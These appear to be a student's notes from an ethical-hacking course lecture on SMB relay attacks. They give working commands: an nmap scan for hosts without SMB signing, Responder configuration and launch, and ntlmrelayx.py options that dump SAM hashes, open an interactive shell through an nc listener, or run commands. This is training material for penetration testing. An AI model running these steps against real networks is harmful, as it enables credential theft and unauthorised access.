Capturing Hashes with Responder (Heath Adams - The Cyber Mentor - Practical Ethical Hacking - The Complete Course)
https://academy.tcm-sec.com/courses/1152300/lectures/48477902
- LLMNR Poisoning


- SMB Relay
* instead of cracking a captured hash, relay it directly to another machine in the network to gain access
* only works with machines that have SMB signing either DISABLED or NOT ENFORCED (this is default for workstations; but servers usually have SMB signing enabled and enforced)
* only worthwhile if the relayed credentials have at least local admin priv on the machine you are attacking
* sample nmap scan to check which machines in domain do not have SMB signing enforced:
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn
note: it is worthwhile to add the -Pn flag in case the devices you are scanning are configured not to respond to pings
note: Nessus can also be used to find machines vulnerable to this attack
1) configure responder for SMB relay:
sudo nano /etc/responder/Responder.conf
turn `SMB =` and `HTTP =` both to OFF
2) run responder, example:
sudo responder -I tun0 -dwP
3) sudo ntlmrelayx.py -tf <name_of_file_containing_vuln_ips>.txt -smb2support 
this will dump SAM hashes
[note:
* the version of ntlmrelayx.py that comes with Impacket v0.9.19 works (comes with the Heath Adams recommended pimpmykali package (see github); the later versions have tended not to work so well
* adding -i at the end of the command will get an interactive shell if you also have a listener [e.g. nc 127.0.0.1 11000]
* adding -c <command, e.g. whoami> will allow you to run a command]

